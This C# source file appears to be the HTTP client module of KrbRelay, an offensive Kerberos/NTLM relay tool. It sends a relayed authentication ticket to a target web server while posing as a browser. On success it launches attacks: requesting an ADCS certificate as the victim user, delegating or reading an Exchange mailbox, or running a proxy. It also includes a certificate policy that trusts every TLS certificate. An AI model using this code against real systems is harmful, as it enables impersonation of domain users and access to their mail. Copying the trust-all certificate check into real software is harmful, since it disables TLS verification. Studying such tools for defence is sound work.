using Org.BouncyCastle.X509;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Http
    {
        public static void Connect()
        {
            string endpoint = "";
            if (!string.IsNullOrEmpty(attacks["endpoint"]))
            {
                endpoint = attacks["endpoint"].TrimStart('/');
            }

            HttpResponseMessage result;
            var cookie = string.Format("Negotiate {0}", Convert.ToBase64String(ticket));

            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
            {
                message.Headers.Add("Authorization", cookie);
                message.Headers.Add("Connection", "keep-alive");
                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                result = httpClient.SendAsync(message).Result;
            }
            //Console.WriteLine(result.StatusCode);
            //Console.WriteLine(result.Headers);
            //Console.WriteLine(result.Content);

            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");

                //Kerberos auth may not require set-cookies
                IEnumerable<string> cookies = null;
                foreach (var h in result.Headers)
                {
                    if (h.Key == "Set-Cookie")
                    {
                        cookies = h.Value;
                        Console.WriteLine("[*] Authentication Cookie;\n" + string.Join(";", h.Value));
                    }
                }

                try
                {
                    if (attacks.Keys.Contains("proxy"))
                    {
                        Attacks.Http.ProxyServer.Start(httpClient, httpClient.BaseAddress.ToString());
                    }

                    if (attacks.Keys.Contains("adcs"))
                    {
                        Attacks.Http.ADCS.requestCertificate(httpClient, relayedUser, relayedUserDomain, attacks["adcs"]);
                    }

                    if (attacks.Keys.Contains("ews-delegate"))
                    {
                        Attacks.Http.EWS.delegateMailbox(httpClient, relayedUser, attacks["ews-delegate"]);
                    }

                    if (attacks.Keys.Contains("ews-search"))
                    {
                        Attacks.Http.EWS.readMailbox(httpClient, "inbox", attacks["ews-search"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                Environment.Exit(0);
            }
            else
            {
                foreach (var header in result.Headers)
                {
                    //Console.WriteLine(header.Key);
                    if (header.Key == "WWW-Authenticate")
                    {
                        string headerValue = header.Value.First().Replace("Negotiate ", "").Trim();
                        if (headerValue.Length < 10) {
                            Console.WriteLine("[-] No WWW-Authenticate header returned, status code: {0}", result.StatusCode);
                            Environment.Exit(0);
                        }
                        else if (Program.ntlm)
                        {
                            ntlm2 = Convert.FromBase64String(headerValue);
                            Console.WriteLine("[*] ntlm2: {0}", Helpers.ByteArrayToString(ntlm2));
                        }
                        else
                        {
                            apRep1 = Convert.FromBase64String(headerValue);
                            Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
                        }
                        return;
                    }
                }
            }
        }
    }

    internal class TrustAll : ICertificatePolicy
    {
        public TrustAll()
        {
        }

        public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem)
        {
            return true;
        }

        public bool CheckValidationResult(ServicePoint srvPoint, System.Security.Cryptography.X509Certificates.X509Certificate certificate, WebRequest request, int certificateProblem)
        {
            return true;
        }
    }
}